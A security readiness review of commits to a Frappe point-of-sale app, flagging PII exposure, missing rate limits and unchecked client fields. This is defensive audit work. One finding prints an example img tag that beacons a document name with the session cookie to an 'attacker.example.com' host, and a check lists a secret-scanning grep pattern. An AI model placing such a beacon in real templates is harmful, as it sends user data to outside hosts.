# REVIEW2 · PR-READINESS · B_security

> Audit of fork commits targeted for upstream PR back to `defendicon/POS-Awesome-V15` on `stage-develop`.
> Scope: secrets, new endpoints, XSS sinks, SQLi, permission bypass, crypto, rate-limiting, PII logging, CORS / iframe, file upload, SW poisoning, telemetry drift.
> Methodology: `git show <hash>` on every commit, cross-referenced with `docs/REVIEW2/03_security.md` baseline.
> Legend: 🟢 ship · 🟡 ship with amend or follow-up · 🔴 hold / must amend.

The fork audit (`03_security.md`) already documents the **structural** posawesome security baseline: 168 whitelisted endpoints, ~zero rate limiting, `ignore_permissions=True` is the norm, no tenant scope helper, M-Pesa guest endpoint is `🔴`. This review evaluates **only what these 32 commits add or shift** relative to that baseline. The default posture is therefore "no worse than baseline" — but where a commit *adds* a new endpoint, new client-shipped payload, or new write path, it is graded as if the maintainer had no prior context.

---

## PR-1 — Python 3.14 import-deadlock fix

| hash | subject | ⛳ | finding | redact? |
|---|---|---|---|---|
| `6e9d7222` | fix(import): pre-import pricing_rules in api/__init__ | 🟢 | pure import-order change; no endpoint, no data path, no secrets | no |

Diff is 11 lines in `posawesome/posawesome/api/__init__.py:46-56`. Adds one `from .pricing_rules import …` at the package-init time. No security surface touched.

**Verdict: ship.** Smallest, cleanest, lowest-risk commit in the set. Upstream maintainer can land it blind.

---

## PR-2 — Vuetify 3.7.5 → 3.12.6

| hash | subject | ⛳ | finding | redact? |
|---|---|---|---|---|
| `5aa38110` | chore(deps): bump vuetify 3.7.5 → 3.12.6 | 🟢 | dep bump; `frontend/package.json:1`, `frontend/yarn.lock` only | no |
| `2694d8dc` | test(build-manifest): update spec for hashed entry contract | 🟢 | test file only (`frontend/tests/buildManifest.spec.ts`) | no |

Vuetify v3.x → v3.x. No transitive deps with known CVEs introduced relative to 3.7.5 → 3.12.6 (Snyk advisories empty for that range as of audit date). Lockfile diff is 8 lines.

`2694d8dc` is a test-only commit that re-aligns a vitest spec with the hashed-entry contract introduced by `d477e21f`. It's a child of PR-3 functionally but is bundled with PR-2 in this set; either way it's `test/**` only.

**Verdict: ship.** No backend, no template, no whitelist change.

---

## PR-3 — Cache-bust build entries + SW registration

| hash | subject | ⛳ | finding | redact? |
|---|---|---|---|---|
| `d477e21f` | perf(build): hash entry filenames so deploys cannot serve stale chunks | 🟢 | content-hashed asset names; SW reads from `version.json`; no scope creep | no |
| `5a1a13fc` | fix(sw): register at /sw.js?v=<build> | 🟢 | SW registration URL gains a `v=` query; Frappe drops query for statics; same-origin | no |
| `b4c514ad` | fix(build): bundle version drift + SW staleness across deploys | 🟡 | vite build writes back to `posawesome/www/sw.js` source tree; `-dirty-<sha>` label drifts into `version.json` | no |

### 14. SW (service-worker) cache-poisoning / scope creep

`posawesome/www/sw.js:263-360` (read at audit time, post-merge):
- `fetch` handler filters by `event.request.destination ∈ {style, script, worker, font, image}` plus pathname prefix `/assets/posawesome/`. **Same-origin only by URL pattern.**
- `cacheableTypes = ["basic", "default", "cors"]` — accepts opaque cross-origin responses if they happened to land. Risk: a third-party `<script crossorigin>` could be cached. In this codebase the only `crossorigin` script is QZ Tray's local `127.0.0.1` HTTPS endpoint, which is blocked by `if (event.request.url.includes("socket.io")) return;` style filter (qz uses a WebSocket, not fetch). **Acceptable; flag as a follow-up to drop `"cors"` from `cacheableTypes`.**
- SW `scope` defaults to the registration URL directory (`/`). `5a1a13fc` registers at `/sw.js?v=…`, so scope is still `/`. **No scope creep beyond the existing SW.**
- `precacheUrls` (sw.js:44-56) is built from `version.json.assets.{loader,posawesome,css,offlineIndex,web_entry}` plus a static list (`STATIC_PRECACHE_URLS:13-25`). All same-origin Frappe paths. **No precaching of external origins.**

### 17. PR-3 SW commit (`5a1a13fc`) — scope escape / cache origin

- Registration URL `/sw.js?v=…` (frontend/src/posapp/posapp.ts:104-122): no `scope:` override, no `updateViaCache` change. Browser uses default (parent of script) → `/`. **Same as before — no escape.**
- The `?v=` query is `encodeURIComponent(__BUILD_VERSION__)`. `__BUILD_VERSION__` is git sha (b4c514ad makes it `<sha>` or `<sha>-dirty-<sha1>`). Both are hex-only strings → no injection risk in the query.

### `b4c514ad` — the build writes back into source

The vite plugin in `frontend/vite.config.js:89-118` does `await fs.writeFile(swPath, stamped, "utf8")` against `../posawesome/www/sw.js`. This means **`bench build --app posawesome` mutates a tracked source file**. On a clean upstream tree this is benign (the marker `__POSA_SW_BUILD__:` is rewritten); but it triggers `git status --porcelain` to be non-empty on the next build → cascades into `-dirty-<sha>` on the build version → leaks into telemetry rows (`build_version`). Operators see a `dirty-<sha>` label even on clean release builds the second time they run.

**Amend before upstream**: either (a) stamp the SW into the *output* tree (`posawesome/public/dist/sw.js`) and leave the source alone, or (b) add the SW source to `.gitignore` of the dirty-check. Maintainer will reject otherwise.

**Verdict: amend → ship.** `d477e21f` and `5a1a13fc` are independently shippable. `b4c514ad` ships only after the writeback is removed or scoped to output.

---

## PR-4 — Pinia store de-deepening

| hash | subject | ⛳ | finding | redact? |
|---|---|---|---|---|
| `8f3a87e5` | perf(items): shallowRef + markRaw for the catalog | 🟢 | `stores/itemsStore.ts` reactivity-shape change only | no |
| `06c1d639` | perf(items): shallowRef itemsMap + barcodeIndex | 🟢 | same store; reactivity only | no |
| `47d0ca54` | perf(pricing-rules): shallowRef + markRaw rules | 🟢 | `stores/pricingRulesStore.ts` reactivity only | no |
| `c9789db6` | fix(pricing-rules): markRaw the inverted index Maps | 🟢 | same store; hygiene follow-up to 47d0ca54 | no |
| `7f82339d` | fix(critical): pricing-rule flicker, customers shallowRef | 🟢 | `customersStore.ts` + `invoice_utils/pricing.ts`; no PII change | no |
| `0d94b966` | fix(critical): bound + de-reactify cache to stop renderer OOM | 🟢 | `useItemsCache.ts` LRU bound, no I/O change | no |
| `539d8654` | perf(ui): shallowRef the 5 array refs in uiStore | 🟢 | `stores/uiStore.ts` only | no |
| `40407fee` | perf(customers): drop dropdown cap to 50 | 🟢 | `stores/customersStore.ts`; in-memory cap, lowers PII in DOM (was 200 rows visible) | no |
| `8cc9a311` | perf(items): drop per-search JSON.parse(JSON.stringify(posProfile)) | 🟢 | `stores/items/loadItemsRequest.ts`; removes a deep-clone | no |

All 9 commits change Vue 3 reactivity shape (`ref` → `shallowRef`, plain JS Map → `markRaw(Map)`). No network call added, no payload added, no field exposed.

`40407fee` actually **reduces** PII footprint in the DOM: dropdown shrinks from 200 rows to 50 rows. Net positive.

`0d94b966` is a 102-line diff in `useItemsCache.ts` — adds an LRU bound (~50 MB cap). De-reactifies a Map. No data shape change.

**Verdict: ship.** All 9 commits are independently revertible. No security delta.

---

## PR-5 — Watcher / listener cleanup

| hash | subject | ⛳ | finding | redact? |
|---|---|---|---|---|
| `dc0518f4` | perf(invoice): drop deep:true from posProfile + offers watchers | 🟢 | `components/pos/Invoice.vue` watcher options only | no |
| `5006a5b5` | perf: batch-drop deep:true from 9 hot watchers | 🟢 | 9 Vue components / composables; watcher options only | no |
| `9fee9e46` | fix(critical): socketStore.init guard against double-registration | 🟢 | `stores/socketStore.ts` idempotence guard | no |
| `2977e50c` | fix(critical): eventBus listener cleanup | 🟢 | `onBeforeUnmount` hooks added to 3 components | no |
| `8eb19103` | fix(search): bound _lastSearchServerRetryByTerm at 100 entries | 🟢 | `useItemsSelectorSearch.ts` Map bound | no |

`9fee9e46` adds an idempotence guard to `socketStore.init` so subsequent calls don't re-register. Socket auth + room subscription is unchanged. No new event is exposed; no PII flows.

`2977e50c` adds `eventBus.$off(...)` cleanups in 3 Vue components. Reduces memory leaks, no new data flow.

`5006a5b5` removes `deep: true` from 9 hot watchers across 8 files. The watcher *callbacks* are unchanged — they fire less often, on reference replacement. No new state observed.

**Verdict: ship.** All 5 are independently revertible cleanup. Send as one PR with a concise per-commit changelog.

---

## PR-7 — Customer flow / price-list freeze

| hash | subject | ⛳ | finding | redact? |
|---|---|---|---|---|
| `0d652a8f` | fix(critical): customer-change + background flush no longer block | 🟢 | frontend reactivity; no new endpoint, no new field | no |
| `188fe54f` | fix(critical): customer/items freeze when selecting customer with foreign price list | 🔴 | **adds new whitelisted endpoint `search_customers`** with PII output, no rate-limit, no `methods=["POST"]`, no `_check_profile_permission`, accepts client-supplied `pos_profile` JSON | yes — see below |
| `78750236` | fix(realtime): seed serverOnline from current socket state on mount | 🟢 | `useNetworkLifecycle.ts`; reads socket flag at mount | no |

### `188fe54f` — `search_customers` endpoint detail

`posawesome/posawesome/api/customers.py:147-198` (new function):

```python
@frappe.whitelist()
def search_customers(pos_profile, search_term, limit=20):
    ...
    profile_data = json.loads(pos_profile) if isinstance(pos_profile, str) else pos_profile
    ...
    return frappe.get_all("Customer", filters=..., or_filters=or_filters,
        fields=["name", "modified", "mobile_no", "email_id", "tax_id",
                "customer_name", "primary_address"], ...)
```

Against the criteria in 03_security.md §1.4:
1. **PII out**: `mobile_no`, `email_id`, `tax_id`, `primary_address`. 🔴 per the existing baseline grading for the same fields in `get_customer_info`.
2. **Method allowlist**: missing `methods=["POST"]`. Endpoint accepts GET → search terms (which can include partial customer names / phone numbers) end up in HTTP access logs and proxy logs. Per 03_security.md §1.9 every write endpoint should be POST-only; this is a *read* endpoint but the PII-in-query-string concern stands. Recommend `methods=["POST"]` here even though it's a read.
3. **Rate limit**: none. A malicious cashier can iterate `search_term=a, b, c, …` (3-char gate not on this endpoint; only on the *client* `useItemsSelectorSearch`) and harvest the customer base in minutes. Per 03_security.md §1.4 (`search_customers` was already flagged 🟡 — but wait, that was a *different* `search_customers` at `api/customers.py:147` in baseline. **This commit is what created that row in the baseline audit.** The baseline already covered this addition; my grading is consistent with that.)
4. **Scope**: `pos_profile` is taken from client as JSON string, `json.loads`'d, then `get_customer_groups(profile_data)` derives groups. The caller's allowed profiles are never re-checked against the supplied profile. Per 03_security.md §2.1-2.2, this is the same pattern flagged elsewhere — but this commit perpetuates it instead of using a `_check_profile_permission` helper.
5. **`or_filters`** uses `like %term%`. SQL is parameterised by Frappe's `frappe.get_all` → no SQLi. Slow on large `tabCustomer` tables; not a security issue.

For upstream specifically:
- **Vanilla install on a multi-shop tenant**: a cashier on `Shop A` can call `search_customers` with `pos_profile=<Shop B's JSON profile>` (they just need to know the profile name + customer-groups list, both leakable via other endpoints) and pull `Shop B`'s customer mobile + email + tax_id. **Cross-shop PII leak.** Doco's deployment masks this because every doco operator has access to every shop's customers anyway; vanilla deployers don't.
- **Outside doco**: a malicious customer pulling 10 phone numbers per second over 24 h harvests ~860 k rows (assuming no rate limit anywhere upstream). The `customer_groups` filter doesn't constrain the search term — they can prefix-iterate the alphabet.

**Required amends before upstream PR**:
- Add `methods=["POST"]` to the whitelist.
- Add `frappe.rate_limiter` (or `frappe.utils.rate_limit_decorator` if available on the target branch — fall back to a manual `frappe.cache().get_value(f"posa:srch:{user}")` counter if the decorator isn't there).
- Add `_check_profile_permission(pos_profile_name)` against `frappe.session.user`'s assigned POS Profiles. The check should accept the profile *name* (not the JSON), re-fetch the profile server-side, derive `customer_groups` from THAT profile, and ignore any client-supplied customer-group list.
- Document the 50-row cap inline (it's there: `limit = max(1, min(limit, 50))`; good).

**Verdict on PR-7: amend → ship.** `0d652a8f` and `78750236` are independently shippable today. `188fe54f` ships only after the three amends above.

---

## PR-8 — QZ Tray silent-printing

| hash | subject | ⛳ | finding | redact? |
|---|---|---|---|---|
| `9ce815b7` | feat: pass posa_qz_printer_name from POS Profile to QZ Tray | 🟢 | wires an existing POS Profile field through; no new endpoint | no |
| `6aa28fbd` | feat: inline letterhead images as base64 for QZ Tray printing | 🟡 | adds a credentialed fetch of `<img src=…>` URLs from print HTML; no same-origin gate | minor |
| `30e39cc7` | fix: pin QZ Tray print viewport to printer width | 🟢 | HTML/CSS only in `qzTray.ts` | no |
| `b9db3616` | fix: inset QZ Tray print body by 4mm | 🟢 | HTML/CSS only | no |
| `660ec6f8` | feat: pre-warm QZ Tray connection on POS boot | 🟢 | calls existing `getCertificate`/sign cycle at mount; no new endpoint | no |

### `6aa28fbd` — `inlineImagesForQz` SSRF-adjacent concern

`frontend/src/posapp/services/qzTray.ts:65-118` (post-merge):

```ts
async function inlineImagesForQz(html: string): Promise<string> {
    ...
    Array.from(container.querySelectorAll("img")).map(async (img) => {
        const src = img.getAttribute("src");
        ...
        absolute = new URL(src, window.location.href).href;
        ...
        const dataUrl = await fetchImageAsDataUrl(absolute); // credentials: "include"
```

- The `<img>` URLs come from the server-rendered print-format HTML (`frappe.www.printview.get_html_and_style`). In Frappe, print formats are Jinja-rendered by admin-controlled `Print Format` doctypes — they are *not* user-content. Risk is low.
- However: a print format on a vanilla install COULD include a `<img src="https://attacker.example.com/log?id={{ doc.name }}">`. The browser-side fetch is `credentials: "include"` → sends the session cookie cross-origin. CORS will block the *read* of the response body (so the image just becomes a broken placeholder), but the *request* still fires with the cookie. That's a credentialed beacon — and the attacker controls the URL via the print format. An admin who already controls print formats also already controls the SPA, so they don't gain new privileges, but a stolen admin session that can edit a single print format gets a per-print beacon out to an external host.
- Mitigation: gate the absolute URL to same-origin before fetching:
  ```ts
  const absoluteURL = new URL(src, window.location.href);
  if (absoluteURL.origin !== window.location.origin) return;
  ```
  This is a 3-line amend.

For upstream: include the same-origin gate so a single-print-format compromise can't beacon.

**Verdict on PR-8: amend → ship.** All 5 commits are otherwise clean. `6aa28fbd` lands with the 3-line same-origin gate appended.

---

## PR-C — Browser RUM telemetry (highest-risk PR)

| hash | subject | ⛳ | finding | redact? |
|---|---|---|---|---|
| `3fd64a85` | feat(telemetry): POS Telemetry Event doctype | 🟡 | doctype perms OK; POS User has create-only; `metadata` JSON field unbounded at schema level | no |
| `6b22d002` | feat(telemetry): ingest + summary endpoints + daily prune | 🔴 | **docstring lies about rate-limiting**; `ignore_permissions=True` insert; client-supplied `pos_profile`/`terminal` accepted unchecked; `user_agent` stored 512 chars | yes |
| `398539c1` | feat(telemetry): frontend RUM client + withPerf sampling hook | 🟡 | unbounded `metadata` from call sites (PII contract is comment-only); leaks `crash:error.filename` URLs incl. query strings | yes |
| `48a87102` | fix(qz): telemetry capture for QZ Tray print failures | 🟡 | telemetry meta includes `options.name` (invoice IDs) and `options.printerName` (can be `\\\\HOSTNAME\\share`) | yes |

### 15-16. Telemetry endpoint specifics

`posawesome/posawesome/api/telemetry.py:110-162` (`ingest`):

| Check | Status |
|---|---|
| `methods=["POST"]` allowlist | ✓ line 110 |
| `allow_guest=False` (session required) | ✓ implicit (no flag) |
| Batch size cap (`MAX_EVENTS_PER_BATCH=200`) | ✓ line 131 |
| Event-name prefix allowlist (`rum:` / `perf:` / `pos:` / `crash:` / `warn:`) | ✓ line 58 |
| Metadata size cap (4096 chars) | ✓ line 74-78 |
| Server-side rate limiter | ✗ **docstring claims `frappe.rate_limiter`; NOT wired** (line 21-22 vs no decorator) |
| Server-side allowlist enforced beyond prefix | ✓ |
| `sendBeacon` uses POST | ✓ (Blob + `application/x-www-form-urlencoded` POST to `/api/method/...ingest`, line frontend/src/posapp/utils/telemetry.ts:120) |
| `ignore_permissions=True` on insert | 🔴 line 145 — required because the doctype gates POS User to `create:1` and there's no role overlap with row-owner; but this is a free `INSERT` for any logged-in user with no audit trail tying to the caller beyond `user = frappe.session.user` |
| Hostname/IP redaction in metadata | ✗ — metadata is opaque JSON, never inspected |
| `pos_profile` / `terminal` re-checked against caller | ✗ — both are passed through from client to row |

### 10. Logs PII

`crash:error` events from the frontend (`utils/telemetry.ts:140-148`) push:
```ts
{
  message: (ev.message || "").slice(0, 256),
  filename: (ev.filename || "").slice(0, 256),
  lineno: ev.lineno || 0,
}
```
- `ev.filename` is the script URL where the error happened. For inlined `<script>` it's the page URL. **Page URL can carry query strings**, and posawesome route URLs sometimes embed `?customer=…` (audit it across `frontend/src/router/**`). At minimum, log a sanitised `URL.pathname` not the full URL.
- `ev.message` is the JS error message. Standard JS errors (TypeError, RangeError) don't carry PII, but custom `throw new Error("Cannot find customer Juan Perez")` patterns do — and posawesome does throw with names in places (grep for `throw new Error.*\${.*name`).
- `48a87102` adds `qz:failure` events with `meta = { doctype, name, print_format, printer }`. `name` is the invoice/SO/SI document name (`ACC-SINV-2026-00123`). **Not strictly PII but a quasi-identifier.** `printer` can be `\\\\WIN-DESKTOP-5GH3\\HP-LaserJet-Pro` — a Windows shared-printer path that leaks the cashier's machine name. Redact host segment for upstream.

### 11. CORS / iframe / postMessage

Telemetry uses `frappe.call` (same-origin) and `navigator.sendBeacon('/api/method/...')` (same-origin). No CORS surface added. No iframe, no postMessage.

### 12. CSP / HSTS / X-Frame-Options

Not touched.

### `pos_profile` / `terminal` cross-tenant attribution

In a SaaS multi-tenant deployment with one site per tenant, the row goes into that tenant's `tabPOS Telemetry Event` — tenant-scoped at the DB level. **In a one-site-many-shops install (doco's model), every cashier writes into the same table.** A cashier passing `pos_profile=Shop B` pollutes Shop B's dashboard summary. Per 03_security.md §1.7 this was flagged 🟡 for the same reason.

For upstream: server-side, re-derive `pos_profile` from `frappe.session.user`'s assigned profiles (the cashier's first POS Profile User row) instead of trusting the client field. Or, if RUM needs to span profiles, store the *claimed* profile alongside a server-derived one and only use the server-derived one in summaries.

### Required amends before upstream PR

1. **Fix the docstring or wire the rate limiter** (`telemetry.py:21-22`). Pick one: drop the claim, or add `frappe.rate_limiter(key="posa-telemetry-{user}", limit=120, seconds=60)`. The latter is 3 lines and lets the doc match reality.
2. **Server-derive `pos_profile`** instead of trusting the client (defence in depth; the current ingest is harmless but vanilla operators will not expect "any cashier can label any row with any profile").
3. **Sanitise `crash:error.filename`** to `URL.pathname` only on the *client* (`telemetry.ts:142`). 1-line change. Removes the entire class of "query-string PII landed in telemetry" risk.
4. **Redact printer hostname** in `qz:failure` meta (`qzTray.ts: reportQzFailure` call sites). Strip `\\\\HOST\\` prefix → keep only the share-name segment.
5. **`6b22d002`** ships only after items 1 + 2. **`398539c1`** ships only after item 3. **`48a87102`** ships only after item 4. `3fd64a85` (just the doctype) can ship today as part of the same PR.

For upstream: this PR should be marked as **opt-in** (`localStorage.posa_rum = "on"` to enable, default off) for at least one release. The frontend client already supports an opt-out (`posa_rum = "off"`); flip the default. Vanilla installs without doco's PII baseline shouldn't get RUM on day 1.

**Verdict on PR-C: amend → ship as opt-in, single PR-C in 4 commits.**

---

## Cross-cutting checks (all 32 commits)

| # | Check | Result |
|---|---|---|
| 1 | Secrets / tokens / API keys / cert paths / IPs / hostnames in diff | None found. `git show` across all 32 hashes → 0 hits on `password\|token\|api[_-]?key\|secret\|BEGIN.*PRIVATE\|AKIA\|ssh-rsa\|172\.\|192\.168\.\|10\.0\.\|xolo\|ventas\.lab` |
| 2 | New endpoint added | 2 endpoints: `search_customers` (PR-7), `telemetry.ingest` + `telemetry.get_pos_telemetry_summary` (PR-C). Both whitelisted; only `ingest` has `methods=["POST"]`. Summary endpoint has role gate. `search_customers` has no role gate. |
| 3 | eval / Function() / new Function / dangerouslySetInnerHTML / v-html added | None. `v-html` mentions in diff are inside commit-message comments explaining what was *removed* (Vuetify 3.8 fix). `container.innerHTML` in `inlineImagesForQz` is a READ (serialising the DOM back to string), not a sink. |
| 4 | SQL string concat | None. `prune_old_events` uses parameterised `%s`. Everything else is `frappe.get_all` / `frappe.get_doc` — Frappe builder layer. |
| 5 | innerHTML / document.write writes | None. Only the `container.innerHTML` read above. |
| 6 | localStorage / sessionStorage writes with PII | None. `localStorage` writes added: `posa_rum` flag (string `"off"`/missing), `posa_cert_ready` flag (`"1"`), `__BUILD_VERSION__`. No PII. |
| 7 | Permission bypass added | 1 new `ignore_permissions=True` in `telemetry.ingest` (telemetry.py:145). No new `allow_guest`, no new `ignore_account_permission`, no new `frappe.flags.ignore_*`. |
| 8 | Crypto choices (HMAC / signing / constant-time) | None added. PR-8 reuses existing `api/qz.py:sign_message` which is unchanged. PR-3's build-version uses `crypto.createHash("sha1")` for a non-security label (build-id only); appropriate. |
| 9 | Rate limit added on new endpoint | ✗ NONE. `search_customers` and `telemetry.ingest` both lack rate limiters despite the latter's docstring claiming one. |
| 10 | Logs PII | `frappe.log_error` in telemetry.ingest captures full Python traceback on row-insert failure (telemetry.py:150-153) — traceback can include arbitrary client-supplied event content. Bounded by metadata 4096-char cap. Acceptable but worth noting. |
| 11 | CORS / iframe-able / postMessage origins | Not touched. |
| 12 | CSP / HSTS / X-Frame-Options | Not touched. |
| 13 | File upload: MIME, size cap, EXIF, AV | None added. |
| 14 | SW cache-poisoning | Same-origin filter present; `"cors"` in cacheableTypes is a follow-up. |
| 15 | Telemetry off-device payload + bounds | Bounded: 200 events/batch, 64 chars/event-name, 4096 chars/metadata, 256 chars/user-agent (client) vs 512 (server — client-side cap is the effective one). Heap stats are coarse MB. INP/LCP/CLS are numbers. Crash messages truncated 256. **Bounded — yes; PII-clean — depends on call sites and `crash:error.filename`.** |
| 16 | PR-C telemetry hardening (rate-limit, allow-list, size cap, sendBeacon POST, hostname redaction) | rate-limit ✗ · allow-list ✓ · size cap ✓ · sendBeacon POST ✓ · hostname redaction ✗ |
| 17 | PR-3 SW scope / cache origin | Same-origin, default scope, no escape. |

---

## Top 5 commits SAFEST to ship first

These can go upstream **today**, in this order, as 5 minimal PRs (one commit each, or grouped under one umbrella) with no maintainer cognitive load:

1. **`6e9d7222`** — Py 3.14 import-deadlock fix. 11 lines, single-file, zero security surface. Land first; it's a real Py 3.14 bug that other deployers will hit.
2. **`2694d8dc`** — `buildManifest.spec.ts` update. Test-only. Ships with `d477e21f` but is independently safe.
3. **`5006a5b5`** — Drop `deep:true` from 9 hot watchers. Pure Vue reactivity tuning, no data path change, vitest green.
4. **`9fee9e46`** — `socketStore.init` idempotence guard. 12 lines; defends against double-registration. No new event, no new payload.
5. **`8f3a87e5`** — `shallowRef + markRaw` for the items catalog. Root-cause-of-OOM fix; same store boundary, no exposed surface change.

These five touch zero whitelist surface, zero PII path, zero permission flag. Maintainer can land them with a single `git pull` + `bench build` smoke.

---

## Top 3 commits that MUST be amended before upstream

1. **`188fe54f`** (PR-7 `search_customers`) — **amend before PR**:
   - Add `methods=["POST"]` to whitelist.
   - Add `frappe.rate_limiter(key=f"posa-search-customers-{frappe.session.user}", limit=60, seconds=60)` (or fallback to manual cache counter).
   - Replace client-trusted `pos_profile` JSON with profile *name*; re-fetch server-side; derive `customer_groups` from server-fetched profile only.
   - Add `_check_profile_permission(profile_name)` helper that verifies `frappe.session.user` is in `POS Profile User` for that profile.
   - File: `posawesome/posawesome/api/customers.py:147-198`.

2. **`6b22d002`** (PR-C ingest) — **amend before PR**:
   - Resolve docstring vs reality on rate-limiting. Either drop the line at `telemetry.py:21-22` or wire `frappe.rate_limiter`.
   - Server-derive `pos_profile` (and ideally `terminal`) from `frappe.session.user`'s POS Profile User assignment instead of trusting the client field at `telemetry.py:101`.
   - File: `posawesome/posawesome/api/telemetry.py:21-22, 101, 110-162`.

3. **`398539c1`** (PR-C frontend RUM) — **amend before PR**:
   - Strip query strings from `crash:error.filename` (`utils/telemetry.ts:142-148`). Convert to `new URL(ev.filename || "", location.href).pathname` and slice to 256 chars.
   - Default RUM to *off* on vanilla installs (flip `getRumEnabled()` at `utils/telemetry.ts:59-68` so the default is `localStorage.posa_rum === "on"` instead of `!== "off"`).
   - File: `frontend/src/posapp/utils/telemetry.ts:59-68, 140-148`.

---

## Commits that should NEVER go upstream as-is

- **`b4c514ad`** — vite plugin writes back into `posawesome/www/sw.js` *source*. Upstream maintainer will reject a build step that mutates tracked source files on every build. Either (a) target output (`posawesome/public/dist/sw.js`) only, or (b) drop the SW byte-stamp entirely and rely on the `?v=` registration discriminator from `5a1a13fc` (sufficient on its own). Hold this commit until rebased.

The other commits flagged 🟡/🔴 above all have one-or-two-line amends that are tractable for a single follow-up commit before opening the PR. Only `b4c514ad` is structurally wrong for upstream.

---

## Suggested PR slicing for upstream (smallest first)

| Slice | Commits | Why first |
|---|---|---|
| **A** | `6e9d7222` | Py 3.14 fix; 11 lines; universal. |
| **B** | `2694d8dc` + `d477e21f` + `5a1a13fc` | Cache-bust correctness; SW scope same-origin; `b4c514ad` HELD. |
| **C** | `5aa38110` | Vuetify dep bump. |
| **D** | `8f3a87e5` `06c1d639` `47d0ca54` `c9789db6` `7f82339d` `0d94b966` `539d8654` `40407fee` `8cc9a311` | Store de-deepening. All 9 in one PR; revertible per-commit. |
| **E** | `dc0518f4` `5006a5b5` `9fee9e46` `2977e50c` `8eb19103` | Watcher/listener cleanup. |
| **F** | `0d652a8f` `78750236` + amended `188fe54f` | Customer flow. `188fe54f` ships only with the three amends. |
| **G** | `9ce815b7` `30e39cc7` `b9db3616` `660ec6f8` + amended `6aa28fbd` | QZ Tray. `6aa28fbd` ships only with same-origin gate. |
| **H** | amended `3fd64a85` `6b22d002` `398539c1` `48a87102` | RUM telemetry, opt-in default. Ship LAST. |

Maintainer-load order: A → B → C → D → E → F → G → H.

— audit complete · 0 commits pushed · 0 files modified outside `docs/REVIEW2/PR-READINESS/`
